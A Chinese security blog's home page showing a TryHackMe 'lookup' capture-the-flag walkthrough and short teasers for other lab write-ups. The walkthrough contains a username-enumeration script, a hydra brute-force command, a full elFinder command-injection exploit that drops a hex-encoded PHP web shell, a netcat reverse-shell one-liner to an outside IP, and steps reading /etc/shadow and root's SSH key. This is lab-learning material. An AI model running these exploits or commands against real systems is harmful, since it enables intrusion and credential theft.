
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8" />
    <title>jujub3</title>
    <meta name="author" content="jujub3" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta
        name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
    />
    <link rel="icon" href="/images/head.jpg" />
    <link rel="preconnect" href="https://s4.zstatic.net" />
<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
<link rel="preconnect" href="https://fonts.googleapis.cn" />
<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
<link
    rel="stylesheet"
    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
/>
<script> const mixins = {}; </script>

<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>


<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
<link
    rel="stylesheet"
    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
/>
<script src="/js/lib/highlight.js"></script>



<script src="/js/lib/preview.js"></script>





<script src="/js/lib/home.js"></script>

<link rel="stylesheet" href="/css/main.css" />

<meta name="generator" content="Hexo 7.3.0"></head>
<body>
    <div id="layout">
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>加载过慢请开启缓存 浏览器默认开启</p>
                    <img src="/images/loading.gif" />
                </div>
            </div>
        </transition>
        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
    <nav id="desktop-menu">
        <a class="title" href="/">
            <span>JUJUB3</span>
        </a>
        
        <a href="/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/tags/THM">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
    </nav>
    <nav id="mobile-menu">
        <div class="title" @click="showMenuItems = !showMenuItems">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;JUJUB3</span>
        </div>
        <transition name="slide">
            <div class="items" v-show="showMenuItems">
                
                <a href="/">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-house fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                    </div>
                </a>
                
                <a href="/about">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-id-card fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                    </div>
                </a>
                
                <a href="/archives">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-box-archive fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                    </div>
                </a>
                
                <a href="/categories">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-bookmark fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                    </div>
                </a>
                
                <a href="/tags/THM">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-tags fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                    </div>
                </a>
                
            </div>
        </transition>
    </nav>
</div>
<transition name="fade">
    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
</transition>

        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
            <div id="home-head">
    <div
        id="home-background"
        ref="homeBackground"
        data-images="/images/a2.jpg"
    ></div>
    <div id="home-info" @click="homeClick">
        <span class="loop"></span>
        <span class="loop"></span>
        <span class="loop"></span>
        <span class="loop"></span>
        <span class="info">
            <div class="wrap">
                <h1>jujub3</h1>
                <h3>go big or go home</h3>
                <h5></h5>
            </div>
        </span>
    </div>
</div>
<div
    id="home-posts-wrap"
    ref="homePostsWrap"
    true
>
    <div id="home-posts">
        

<div class="post">
    <a href="/2025/04/02/lookup/">
        <h2 class="post-title">lookup</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2025/4/2
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <p>首先需要改在hosts里面加一个：10.10.46.174   lookup.thm   以防止重定向。</p>
<p>仔细观察两个抓包页面：</p>
<p><img src="/../lookup/1.png" alt="1"></p>
<p><img src="/../lookup/2.png" alt="2"></p>
<p>一个返回Wrong username or password一个返回 Wrong password，所以断定存在一个admin账户。</p>
<pre><code class="language-python">import requests
wordlist = &quot;/usr/share/seclists/Usernames/Names/names.txt&quot;


with open(wordlist, &#39;r&#39;) as f:
    for line in f:
        username = line.strip()
        if not username:
            continue

        data = &#123;&quot;username&quot;: username,
                &quot;password&quot;: &quot;testpassword&quot;&#125;
        response = requests.post(url=&quot;http://lookup.thm/login.php&quot;, data=data)

        if &quot;Wrong password&quot; in response.text:
            print(f&quot;\r[*] Found a username! \&quot;&#123;username&#125;\&quot;&quot;)


print()
</code></pre>
<p><img src="/../lookup/3.png" alt="3"></p>
<p>发现存在一个jose</p>
<pre><code class="language-cmd">hydra -l jose -P 10-million-password.txt lookup.thm http-post-form &quot;/login.php:username=^USER^&amp;password=^PASS^:Wrong&quot; -V
</code></pre>
<p>这个爆破有点慢，可以直接用yakit来进行爆破，最后得到账号密码：最后成功进入后台</p>
<pre><code>jose
password123
</code></pre>
<p><img src="/../lookup/4.png" alt="4"></p>
<p>然后根据<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/46481">https://www.exploit-db.com/exploits/46481</a></p>
<pre><code class="language-python">#!/usr/bin/python

&quot;&quot;&quot;
# Exploit Title: elFinder &lt;= 2.1.47 - Command Injection vulnerability in the PHP connector.
# Date: 26/02/2019
# Exploit Author: @q3rv0
# Vulnerability reported by: Thomas Chauchefoin
# Google Dork: intitle:&quot;elFinder 2.1.x&quot;
# Vendor Homepage: https://studio-42.github.io/elFinder/
# Software Link: https://github.com/Studio-42/elFinder/archive/2.1.47.tar.gz
# Version: &lt;= 2.1.47
# Tested on: Linux 64bit + Python2.7
# PoC: https://www.portal.org/news/cve-2019-9194-triggering-and-exploiting-a-1-day-vulnerability/
# CVE: CVE-2019-9194

# Usage: python exploit.py [URL]
&quot;&quot;&quot;

import requests
import json
import sys

# 确保同级目录下存在一个jpg文件
payload = &quot;test.jpg;echo 3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0a | xxd -r -p &gt; hack.php;echo test.jpg&quot;


def usage():
    if len(sys.argv) != 2:
        print(&quot;Usage: python exploit.py [URL]&quot;)
        sys.exit(0)


def upload(url, payload):
    files = &#123;&quot;upload[]&quot;: (payload, open(&quot;test.jpg&quot;, &quot;rb&quot;))&#125;
    data = &#123;
        &quot;reqid&quot;: &quot;1693222c439f4&quot;,
        &quot;cmd&quot;: &quot;upload&quot;,
        &quot;target&quot;: &quot;l1_Lw&quot;,
        &quot;mtime[]&quot;: &quot;1497726174&quot;,
    &#125;

    r = requests.post(&quot;%s/php/connector.minimal.php&quot; % url, files=files, data=data)
    j = json.loads(r.text)
    return j[&quot;added&quot;][0][&quot;hash&quot;]


def imgRotate(url, hash):
    r = requests.get(
        &quot;%s/php/connector.minimal.php?target=%s&amp;width=539&amp;height=960&amp;degree=180&amp;quality=100&amp;bg=&amp;mode=rotate&amp;cmd=resize&amp;reqid=169323550af10c&quot;
        % (url, hash)
    )
    return r.text


def shell(url):
    r = requests.get(&quot;%s/php/hack.php&quot; % url)
    if r.status_code == 200:
        print(&quot;[+] Pwned! :)&quot;)
        print(&quot;[+] Getting the shell...&quot;)
        while 1:
            try:
                inputs = input(&quot;$ &quot;)
                r = requests.get(&quot;%s/php/hack.php?c=%s&quot; % (url, inputs))
                print(r.text)
            except KeyboardInterrupt:
                sys.exit(&quot;\nBye kaker!&quot;)
    else:
        print(&quot;[*] The site seems not to be vulnerable :(&quot;)


def main():
    usage()
    url = sys.argv[1]
    print(&quot;[*] Uploading the malicious image...&quot;)
    hash = upload(url, payload)
    print(&quot;[*] Running the payload...&quot;)
    imgRotate(url, hash)
    shell(url)


if __name__ == &quot;__main__&quot;:
    main()
</code></pre>
<p>成功拿到shell：</p>
<p><img src="/../lookup/5.png" alt="5"></p>
<p>现在我们创建一个有效载荷来建立一个交互式 shell。为此，我们使用 revshell.com。我们选择<code>nc mkfifo</code>一个并对有效载荷进行 URL 编码，因为我们有一个 web shell</p>
<p><img src="/../lookup/6.png" alt="6"></p>
<pre><code>rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.17.33.100%208888%20%3E%2Ftmp%2Ff
</code></pre>
<p><img src="/../lookup/9.png" alt="9"></p>
<p>查找具有suid权限的二进制文：find &#x2F; -perm &#x2F;4000 2&gt;&#x2F;dev&#x2F;null | xargs ls -l</p>
<p>发现了一个可疑的文件：-rwsr-sr-x 1 root   root             17176 Jan 11  2024 &#x2F;usr&#x2F;sbin&#x2F;pwm</p>
<p>ssh进行远程连接，拿到第一个flag，然后sudo -l  查看当前用户在系统上可以使用sudo执行的命令。</p>
<pre><code>think
josemario.AKA(think)
</code></pre>
<p><img src="/../lookup/10.png" alt="10"></p>
<p><img src="/../lookup/11.png" alt="11"></p>
<p>发现有个look直接去：<a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a>   搜索，它有个读文件的用法：</p>
<p><img src="/../lookup/12.png" alt="12"></p>
<p>look ‘’ &#x2F;etc&#x2F;shadow</p>
<p><img src="/../lookup/13.png" alt="13"></p>
<p>发现成功，接下来读取root用户的ssh私钥：</p>
<p>sudo look ‘’ &#x2F;root&#x2F;.ssh&#x2F;id_rsa</p>
<p><img src="/../lookup/14.png" alt="14"></p>
<p>最后将得到的ssh连接的密钥保存到一个id_rsa文件中（记得是全部内容），然后赋予这个文件600权限</p>
<p>chmod 600 id_rsa						最后成功连上去拿到root权限</p>
<p><img src="/../lookup/15.png" alt="15"></p>

            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/THM/" style="color: #ff7d73">THM</a>
        </span>
        
    </div>
    <a href="/2025/04/02/lookup/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2025/04/01/TheStickerShop/">
        <h2 class="post-title">TheStickerShop</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2025/4/1
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <p>nmap进行扫描：</p>
            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/THM/" style="color: #ff7d73">THM</a>
        </span>
        
    </div>
    <a href="/2025/04/01/TheStickerShop/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2025/04/01/Platter/">
        <h2 class="post-title">Platter</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2025/4/1
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <p>信息搜集，在contact里面找到了这个网站的框架： Silverpeas  ，还有一个用户的名字： scr1ptkiddy  </p>
            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/THM/" style="color: #03a9f4">THM</a>
        </span>
        
    </div>
    <a href="/2025/04/01/Platter/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2025/03/31/Lo-Fi/">
        <h2 class="post-title">Lo-Fi</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2025/3/31
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <p>一切都会好起来的，加油！</p>
<p>访问进去就是一个界面</p>
            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/THM/" style="color: #03a9f4">THM</a>
        </span>
        
    </div>
    <a href="/2025/03/31/Lo-Fi/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2025/03/31/brains/">
        <h2 class="post-title">brains</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2025/3/31
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <p>还是太菜了，搞渗透和java吧，这个网站，这也是我的第一篇博客，希望以后也能够坚持下去，加油吧</p>
            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/THM/" style="color: #00bcd4">THM</a>
        </span>
        
    </div>
    <a href="/2025/03/31/brains/" class="go-post">阅读全文</a>
</div>


        <div class="page-current">
    
    <span class="current">1</span>
    
    
    
    
</div>

    </div>
    
    <div id="home-card">
        <div id="card-style">
    <div id="card-div">
        <div class="avatar">
            <img src="/images/head.jpg" alt="avatar" />
        </div>
        <div class="name">jujub3</div>
        <div class="description">
            <p>Description<br>想陪她看海的话，那就先为她刷遍题海吧</p>

        </div>
        
        
        <div class="friend-links">
            
            <div class="friend-link">
                <a target="_blank" rel="noopener" href="https://jujub3.github.io">Argvchs</a>
            </div>
            
        </div>
        
    </div>
</div>

    </div>
    
</div>

            <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2025 jujub3
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;jujub3
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

        </div>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/js/main.js"></script>
    
</body>
</html>
